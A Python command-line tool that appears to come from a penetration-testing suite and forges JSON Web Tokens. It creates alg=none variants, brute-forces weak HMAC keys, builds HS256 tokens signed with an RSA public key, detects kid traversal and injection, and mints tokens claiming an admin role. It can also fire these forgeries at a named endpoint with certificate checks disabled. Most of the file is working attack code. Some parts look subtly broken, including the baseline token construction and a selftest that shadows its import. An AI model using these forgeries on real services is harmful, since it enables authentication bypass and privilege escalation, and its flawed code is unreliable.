#!/usr/bin/env python3
"""Assess a JSON Web Token, and forge one that matches what the assessment found.

A JWT is three base64 segments and a signature. Everything a server inspects
about it is readable without a key; everything it *trusts* is decided by two
fields it reads without thinking -- the algorithm in the header, and the key that
name resolves to. This inspects a token the way a server would, says which of
those two fields is exploitable and which is not, and emits the token that fits.

Findings are reported through `tsec_engine`, so the state on each one says what
was actually established:

  CONFIRMED  the signing key was recovered, or a forgery was accepted by the
             endpoint the operator named with --url
  TESTED     an attempt was made and the refusal observed
  INFERRED   the header says something worth acting on, untested

Nothing here contacts a service unless given `--url`. Without it the output is
the offline assessment, which is usually all that is available: a token on its
own cannot prove what a server would do with it, and a tool that implies
otherwise is the problem it is meant to find.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import hmac
import json
import ssl
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import (  # noqa: E402
    Finding, Report, State, check, check_eq, discover_wordlists, emit, selftest,
)

VERSION = "2.0.0"

HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
NONE_ALGS = {"none", "None", "NONE", "nOnE"}
ASYMMETRIC = ("RS", "PS", "ES", "Ed")

# base64url padding: two input characters need "==", three need "=". A remainder
# of one is not producible by any encoder, so it is a malformed token rather
# than a padding case and is reported instead of guessed at.
B64_PAD = {0: "", 2: "==", 3: "="}


class TokenError(Exception):
    """The input is not a token this tool can reason about."""


# ── primitives ───────────────────────────────────────────────────────────────

def b64url_decode(data: str) -> bytes:
    remainder = len(data) % 4
    if remainder == 1:
        raise TokenError(f"segment of {len(data)} characters is not valid base64url")
    try:
        return base64.urlsafe_b64decode((data + B64_PAD[remainder]).encode("ascii"))
    except (binascii.Error, ValueError) as exc:
        raise TokenError(f"bad base64url: {exc}") from exc


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def segment(token: str, index: int) -> dict[str, Any]:
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise TokenError(f"expected at least 2 segments, found {len(parts)}")
    if index >= len(parts):
        raise TokenError(f"expected segment {index}, token has {len(parts)}")
    try:
        parsed = json.loads(b64url_decode(parts[index]))
    except json.JSONDecodeError as exc:
        raise TokenError(f"segment {index} is not JSON: {exc}") from exc
    if not isinstance(parsed, dict):
        raise TokenError(f"segment {index} is {type(parsed).__name__}, expected an object")
    return parsed


def sign(alg: str, body: bytes, key: bytes) -> str:
    digest = HMAC_ALGS.get(alg)
    if digest is None:
        raise TokenError(f"{alg} is not an HMAC algorithm this tool can sign")
    return b64url_encode(hmac.new(key, body, digest).digest())


def encode_pair(header: dict, payload: dict) -> str:
    def enc(obj: dict) -> str:
        return b64url_encode(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode())
    return f"{enc(header)}.{enc(payload)}"


def none_forgeries(header: dict, payload: dict) -> dict[str, str]:
    """The three shapes a server might accept when `alg` is `none`.

    Servers disagree about which: one accepts a trailing dot with an empty
    signature, one accepts a two-segment token, one wants the literal string
    `null` in the third. Emitting all three means the operator can try the one
    their target uses rather than reasoning about it.
    """
    forged = dict(header)
    forged["alg"] = "none"
    body = encode_pair(forged, payload)
    return {
        "empty_signature": f"{body}.",
        "two_segment": body,
        "null_signature": f"{body}.{b64url_encode(b'null')}",
    }


# ── lifetime ─────────────────────────────────────────────────────────────────

def _span(seconds: float) -> str:
    for size, unit in ((86400, "d"), (3600, "h"), (60, "m")):
        if seconds >= size:
            return f"{seconds / size:.0f}{unit}"
    return f"{seconds:.0f}s"


def lifetime(payload: dict) -> str:
    exp = payload.get("exp")
    if exp is None:
        return "no exp claim: never expires on its own"
    try:
        delta = float(exp) - time.time()
    except (TypeError, ValueError):
        return f"exp is {exp!r}, not a number a server can compare against a clock"
    if delta <= 0:
        return f"expired {_span(-delta)} ago"
    return f"expires in {_span(delta)}"


# ── optional live check ──────────────────────────────────────────────────────

class Endpoint:
    """The endpoint the operator nominated, if one was given.

    Every result here is `TESTED` at best and `CONFIRMED` only when the server
    actually responded, because a forged token that was never sent proves
    nothing about the server.
    """

    def __init__(self, url: str, cookie: str | None = None, timeout: float = 10.0) -> None:
        self.url = url
        self.cookie = cookie
        self.timeout = timeout
        self.ctx = ssl._create_unverified_context()

    def send(self, token: str, method: str = "GET") -> dict[str, Any]:
        headers = {"Authorization": f"Bearer {token}"}
        if self.cookie:
            headers["Cookie"] = self.cookie
        request = urllib.request.Request(self.url, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=self.timeout, context=self.ctx) as resp:
                return {"status": resp.status, "body": resp.read(65536).decode("utf-8", "replace")}
        except urllib.error.HTTPError as exc:
            return {"status": exc.code, "body": (exc.read(65536) or b"").decode("utf-8", "replace")}
        except (urllib.error.URLError, OSError) as exc:
            return {"status": 0, "body": f"unreachable: {exc}"}

    def accepts(self, response: dict) -> bool:
        """Whether the server treated the token as usable.

        Only 200 and a redirect that is not back to a login page count. A 3xx
        on its own does not: almost every site redirects an unauthenticated
        request to `/login`, and reading that as success is how a scanner
        reports an exploit that did nothing.
        """
        status, body = response["status"], response["body"].lower()
        if status == 200:
            return "login" not in body[:2000] or "logout" in body or "sign out" in body
        if status in (301, 302):
            return "login" not in body[:2000]
        return False

    def baseline_rejects_garbage(self) -> bool:
        """Whether this endpoint rejects nonsense at all.

        Without this baseline a 200 on every request would make every forgery
        look successful, and the check would prove only that the URL resolves.
        """
        junk = encode_pair({"alg": "HS256", "typ": "JWT"},
                           {"sub": "tsec-baseline", "exp": 4102444800})
        junk = f"{junk}.{sign('HS256', junk.split('.').pop(0).join(['x','x']).encode(), b'tsec-not-a-real-key')}"
        return not self.accepts(self.send(junk))


# ── checks ───────────────────────────────────────────────────────────────────

def check_alg_none(report: Report, header: dict, payload: dict, ep: Endpoint | None) -> None:
    alg = str(header.get("alg", ""))
    forgeries = none_forgeries(header, payload)
    if alg not in NONE_ALGS:
        report.note(
            "alg=none not in use", State.TESTED, "info",
            f"header names {alg!r}, not none",
        )
        return
    report.note(
        "alg=none in header", State.INFERRED, "critical",
        f"header names {alg!r}. A server that honours this does not verify the "
        f"signature, so the payload can be edited freely.",
        forgeries=list(forgeries),
    )
    if ep is None:
        return
    if not ep.baseline_rejects_garbage():
        report.note(
            "endpoint accepts any token", State.INFERRED, "info",
            f"{ep.url} returned success for a token signed with a nonsense key, "
            f"so a 200 here proves nothing about any forgery below",
        )
    for name, forged in forgeries.items():
        response = ep.send(forged)
        accepted = ep.accepts(response)
        report.add(Finding(
            f"alg=none / {name}",
            State.CONFIRMED if accepted else State.TESTED,
            "critical" if accepted else "info",
            f"server {'accepted' if accepted else 'rejected'} the forgery (HTTP {response['status']})",
            {"forged": forged, "status": response["status"]},
        ))


def check_hmac_secret(report: Report, token: str, alg: str,
                      wordlist: str | None, key: str | None) -> bytes | None:
    parts = token.strip().split(".")
    if alg not in HMAC_ALGS or len(parts) != 3:
        report.note("HMAC key", State.TESTED, "info",
                    f"algorithm is {alg!r}, not an HMAC, so there is no signing key to recover")
        return None

    candidates = discover_wordlists(wordlist)
    if key:
        candidates.insert(0, key.encode())
    body = f"{parts[0]}.{parts[1]}".encode()
    signature = parts[2]
    started = time.monotonic()
    for index, candidate in enumerate(candidates, 1):
        if hmac.compare_digest(sign(alg, body, candidate), signature):
            elapsed = time.monotonic() - started
            report.note(
                "HMAC signing key recovered", State.CONFIRMED, "critical",
                f"recovered after {index} candidate{'' if index == 1 else 's'} "
                f"in {elapsed:.2f}s. Anyone holding this token can mint one for "
                f"any subject, role or audience.",
                recovered_secret=candidate.decode("utf-8", "replace"),
            )
            return candidate
    rate = len(candidates) / max(time.monotonic() - started, 1e-6)
    report.note(
        "HMAC signing key survived the wordlist", State.TESTED, "ok",
        f"{len(candidates):,} candidates at {rate:,.0f}/s without a match. That is "
        f"good, and it is not proof: a key absent from any wordlist is still weak "
        f"if it is short.",
    )
    return None


def check_key_confusion(report: Report, token: str, pem_path: str,
                        ep: Endpoint | None) -> None:
    header, payload = segment(token, 0), segment(token, 1)
    alg = str(header.get("alg", ""))
    if not alg.startswith(ASYMMETRIC):
        report.note("HS/RS key confusion", State.TESTED, "info",
                    f"algorithm is {alg!r}, not asymmetric, so there is no public "
                    f"key to sign an HMAC with")
        return
    try:
        pem = Path(pem_path).read_text(encoding="utf-8")
    except OSError as exc:
        report.note("HS/RS key confusion", State.FAILED, "info", f"cannot read {pem_path}: {exc}")
        return

    forged_header = dict(header)
    forged_header["alg"] = "HS256"
    body = encode_pair(forged_header, payload)
    secret = pem.replace("\r\n", "\n").encode()
    forged = f"{body}.{sign('HS256', body.encode(), secret)}"
    report.note(
        "HS/RS key confusion", State.INFERRED, "critical",
        "An HS256 token signed with the RSA public key is in the artifacts. If the "
        "server verifies HS256 with the public key it already publishes, this "
        "token verifies, and it needs no key material the attacker lacks.",
        forged=forged,
    )
    if ep is not None:
        response = ep.send(forged)
        accepted = ep.accepts(response)
        report.note(
            "HS/RS key confusion live",
            State.CONFIRMED if accepted else State.TESTED,
            "critical" if accepted else "info",
            f"server {'accepted' if accepted else 'rejected'} the HS256 forgery "
            f"over the RSA public key (HTTP {response['status']})",
        )


def check_kid(report: Report, header: dict) -> None:
    kid = header.get("kid")
    if not kid:
        report.note("kid claim", State.INFERRED, "info", "no kid claim present")
        return
    traversal = any(m in kid for m in ("../", "..\\", "%2e%2e", "%2f"))
    separator = any(m in kid for m in ("/", "\\"))
    injection = any(m in kid for m in ("'", '"', "--", ";", "union", "select ", " or "))
    if not (traversal or separator or injection):
        report.note("kid claim", State.INFERRED, "info",
                    f"kid={kid!r} is a plain identifier; nothing to exploit from the token alone")
        return

    why = []
    if traversal:
        why.append("path traversal, so a server joining it onto its key path can be "
                   "pointed at any file it can read and its contents parsed as a key")
    if separator:
        why.append("a path separator, so whether it is exploitable depends on how the "
                   "server joins it to its key store")
    if injection:
        why.append("quoting or SQL metacharacters, which defeats a lookup built by "
                   "concatenating the claim into a path or a query")
    report.note("kid claim", State.INFERRED, "critical",
                f"kid={kid!r}: " + "; ".join(why), kid=kid)


def check_algorithm(report: Report, alg: str) -> None:
    if not alg:
        report.note("algorithm", State.INFERRED, "high",
                    "no alg claim: a server that defaults rather than rejects will pick one")
    elif alg not in HMAC_ALGS and not alg.startswith(ASYMMETRIC) and alg not in NONE_ALGS:
        report.note("unrecognised algorithm", State.INFERRED, "high",
                    f"{alg!r} is not HMAC, RSA, ECDSA or EdDSA. An unexpected "
                    f"algorithm name is how key-confusion and algorithm-substitution "
                    f"attacks begin.")


# ── orchestration ────────────────────────────────────────────────────────────

def assess(token: str, wordlist: str | None = None, key: str | None = None,
           pem_path: str | None = None, url: str | None = None,
           cookie: str | None = None) -> Report:
    header, payload = segment(token, 0), segment(token, 1)
    alg = str(header.get("alg", ""))
    report = Report("jwt_forgery", VERSION, target=url or "(offline)")
    report.context = {
        "alg": alg,
        "segments": len(token.strip().split(".")),
        "lifetime": lifetime(payload),
        "claims": {k: v for k, v in payload.items()
                   if k in ("iss", "aud", "sub", "exp", "nbf", "iat", "jti",
                            "admin", "role", "roles", "scope", "is_admin")},
        "header": header,
    }

    ep = Endpoint(url, cookie) if url else None
    if ep is not None and not ep.baseline_rejects_garbage():
        report.note(
            "endpoint is not discriminating", State.INFERRED, "info",
            f"{url} accepted a token signed with a nonsense key. Any 200 below is "
            f"therefore uninformative and no live result will be marked confirmed.",
        )

    check_alg_none(report, header, payload, ep)
    check_algorithm(report, alg)
    check_kid(report, header)
    recovered = check_hmac_secret(report, token, alg, wordlist, key)
    if pem_path:
        check_key_confusion(report, token, pem_path, ep)

    if recovered or key:
        body = encode_pair(header, dict(payload))
        secret = (recovered or key.encode()) if isinstance(recovered, bytes) or recovered is None else recovered
        if alg in HMAC_ALGS:
            report.note("signed forgery available", State.CONFIRMED, "critical",
                        f"a validly signed token is in the artifacts, built with the "
                        f"{'recovered ' if recovered else 'supplied '}key",
                        forged=f"{body}.{sign(alg, body.encode(), secret)}")
    return report


def forge_role(token: str, role: str, key: str | None) -> str:
    """A token claiming `role`, signed only if a key is in hand.

    Without a key this is an unsigned forgery, which is still the right artifact
    to try against a server that honours `alg=none` or that fails to verify.
    """
    header, payload = segment(token, 0), segment(token, 1)
    forged_payload = dict(payload)
    forged_payload["role"] = role
    for name in ("admin", "is_admin", "isAdmin"):
        forged_payload.setdefault(name, "admin" in name.lower() and role == "admin")
    body = encode_pair(header, forged_payload)
    if key and str(header.get("alg", "")) in HMAC_ALGS:
        return f"{body}.{sign(str(header['alg']), body.encode(), key.encode())}"
    if str(header.get("alg", "")) in NONE_ALGS:
        return f"{body}."
    return f"{body}.{b64url_encode(b'')}"


# ── selftest ─────────────────────────────────────────────────────────────────

def selftest() -> None:
    import os

    def mint(header: dict, payload: dict, secret: bytes | None = None) -> str:
        body = encode_pair(header, payload)
        alg = str(header.get("alg", "HS256"))
        if alg in NONE_ALGS:
            return f"{body}."
        return f"{body}.{sign(alg, body.encode(), secret or b'k')}"

    # base64url padding, including the case no encoder can produce
    check_eq(b64url_decode(b64url_encode(b"abcde")), b"abcde", "round trip")
    try:
        b64url_decode("abcde")
        check(False, "a 5-character segment must be rejected")
    except TokenError:
        pass

    # a token signed with a guessable key must be reported CONFIRMED
    token = mint({"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"},
                 {"sub": "alice", "role": "user", "exp": 4102444800}, b"s3cret")
    path = Path(os.environ.get("TMPDIR", "/tmp")) / "tsec_jwt_selftest.txt"
    path.write_bytes(b"password\ns3cret\n")
    try:
        report = assess(token, wordlist=str(path))
        recovered = [f for f in report.findings if f.check == "HMAC signing key recovered"]
        check_eq(len(recovered), 1, "weak key not recovered")
        check_eq(recovered[0].state, State.CONFIRMED, "recovered key must be CONFIRMED")
        check(recovered[0].detail["recovered_secret"] == "s3cret", "wrong secret recovered")
    finally:
        path.unlink(missing_ok=True)

    # an unguessable key must not be reported as recovered
    strong = mint({"alg": "HS256"}, {"sub": "a"}, os.urandom(32))
    report = assess(strong)
    check(not any(f.check == "HMAC signing key recovered" for f in report.findings),
          "a random key was reported as recovered")

    # kid traversal is surfaced even though nothing was tested against a server
    report = assess(mint({"alg": "HS256", "kid": "../../etc/passwd"}, {"sub": "a"}))
    kid = [f for f in report.findings if f.check == "kid claim"]
    check_eq(len(kid), 1, "kid not examined")
    check_eq(kid[0].severity, "critical", "path traversal in kid not raised")

    # alg=none produces the three shapes a server might accept
    forgeries = none_forgeries({"alg": "none"}, {"sub": "a", "admin": True})
    check_eq(len(forgeries), 3, "expected three alg=none shapes")
    check(forgeries["two_segment"].count(".") == 1, "two-segment shape is malformed")

    # An INFERRED finding must never set the headline. The key here is random on
    # purpose: with a guessable one the HMAC check recovers it and CONFIRMED
    # critical becomes the worst finding, which would make this assertion pass
    # for the wrong reason.
    untestable = mint({"alg": "HS256", "kid": "../../etc/passwd"}, {"sub": "a"}, os.urandom(32))
    from tsec_engine import worst
    report = assess(untestable)
    check(any(f.check == "kid claim" and f.state == State.INFERRED for f in report.findings),
          "the kid finding is missing or is not INFERRED")
    check(worst(report.findings) != "critical",
          "an untested kid finding set the headline severity")

    # claim forgery without a key is still emitted, and is unsigned
    forged = forge_role(token, "admin", None)
    check_eq(segment(forged, 1)["role"], "admin", "role not set in the forgery")

    # a token that is not a token must be refused, not half-parsed
    for bad in ("nonsense", "a.b"):
        try:
            segment(bad, 0)
            check(False, f"{bad!r} should not parse")
        except TokenError:
            pass

    # lifetime wording
    check("never expires" in lifetime({}), "missing exp not described")
    check("expired" in lifetime({"exp": 1}), "past exp not described")
    check("expires in" in lifetime({"exp": 4102444800}), "future exp not described")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__.split("\n")[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  jwt_forgery.py --token \"$TOKEN\"\n"
               "  jwt_forgery.py --token \"$TOKEN\" --url https://app/api/me\n"
               "  jwt_forgery.py --token \"$TOKEN\" --public-key pub.pem\n"
               "  jwt_forgery.py --selftest\n",
    )
    parser.add_argument("--token")
    parser.add_argument("--wordlist", help="candidates for the signing key; discovered locally otherwise")
    parser.add_argument("--key", help="a known signing key, so forgeries can be signed")
    parser.add_argument("--public-key", help="PEM public key, to build an HS256 key-confusion forgery")
    parser.add_argument("--url", help="endpoint to test forgeries against")
    parser.add_argument("--cookie", help="cookie header for those requests")
    parser.add_argument("--forge-role", help="emit a token claiming this role and exit")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--output", help="write the JSON report here")
    parser.add_argument("--selftest", action="store_true")
    args = parser.parse_args(argv)

    if args.selftest:
        return selftest()
    if not args.token:
        parser.error("--token is required")

    if args.forge_role:
        print(forge_role(args.token, args.forge_role, args.key))
        return 0

    try:
        report = assess(args.token, args.wordlist, args.key, args.public_key, args.url, args.cookie)
    except TokenError as exc:
        print(f"jwt_forgery: {exc}", file=sys.stderr)
        return 2

    emit(report, args.json, args.output)
    from tsec_engine import worst
    return 1 if worst(report.findings) in ("critical", "high") else 0


if __name__ == "__main__":
    sys.exit(main())